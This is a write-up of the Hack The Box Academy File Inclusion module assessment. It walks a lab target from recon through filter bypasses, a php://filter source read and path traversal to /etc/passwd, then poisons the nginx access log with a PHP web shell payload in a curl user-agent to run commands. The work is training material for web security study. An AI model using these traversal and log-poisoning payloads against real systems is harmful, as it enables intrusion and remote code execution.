---
slug: /write-up/htb-academy/file-inclusion
pagination_next: null
pagination_prev: null
---
This is the write-up for the assessment of HTB academy [File inclusion](https://academy.hackthebox.com/module/details/23) module.

This a little bit tricky because we know which vulnerability to exploit here: file inclusion.

```bash
whatweb 94.237.49.11:31840/index.php           
http://94.237.49.11:31840/index.php [200 OK] Bootstrap, Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.18.0], IP[94.237.49.11], JQuery[3.3.1], PHP[7.3.22], Script, Title[InlaneFreight], X-Powered-By[PHP/7.3.22], nginx[1.18.0]
```

`whatweb` reveals we're dealing with a PHP/7.3.22 page served by an nginx/1.18.0.

While navigating as a regular user in the website, we can see the URL has a `page` parameter which looks promising for LFI vulnerability.

Visiting http://94.237.49.11:31840/index.php?page=industries../ shows `Invalid input detected!` which is the contents of `error.php` page.

Let's try the basic bypasses:

- Double the input: ./ become ..//. Nothing
- URL encode the symbols: nothing
- Try to escape the approve path: N/A because the pages are in root
- Path truncation: N/A PHP version is recent
- Null byte: N/A PHP version is recent

Let's try with more complex bypasses:

http://94.237.49.11:31840/index.php?page=php://filter/read=convert.base64-encode/resource=main

Worked and return the content of the main.php in base64

In index.php we discover a commented piece of code that makes reference to `ilf_admin/index.php`. If we try to access that page, we get something interesting showing some logs. Worth remembering: http://94.237.49.11:31840/ilf_admin/index.php?log=system.log

The filtering mechanism looks quite simple: 

```php
  $page = $_GET['page'];
  if (strpos($page, "..") !== false) {
    include "error.php";
  }
  else {
    include $page . ".php";
  }
```

http://94.237.49.11:31840/index.php?page=%252e%252e%252fetc%252fpasswd

Looks like might be vulnerable to double encoding, however we're only bypassing the first if and the include only let us include php files.

Let's get back to http://94.237.49.11:31840/ilf_admin/index.php

We can try to brute-force some directories:

```bash
ffuf -w /opt/github/SecLists/Discovery/Web-Content/combined_directories.txt:FUFF -u http://94.237.49.11:31840/ilf_admin/FUFF.php
ffuf -w /opt/github/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.49.11:31840/ilf_admin/index.php?FUZZ=value' -fl 102
```

Nothing revealed.

However, we can try the LFI directly in the log paramter:

http://94.237.49.11:31840/ilf_admin/index.php?log=../../error.php and it worked!

http://94.237.49.11:31840/ilf_admin/index.php?log=../../../../../etc/passwd we have read the passwd file!

In order to have Remote Code Excecution, let's try to see if we can have Remote File Inclusion and add our shell.

We cannot include Remote files, checking the nginx error log, looks like they might be using `file_get_contents` or something like this.

Given we have access to logs, we can poison them and force `ilf_admin` to execute them by setting the user-agent of curl:

```bash
curl -s "http://94.237.59.185:42603/index.php" -A "<?php system($_GET['cmd']); ?>"
```

And now we have a web shell running in the logs page:

http://94.237.59.185:42603/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id

From here we can move to a reverse shell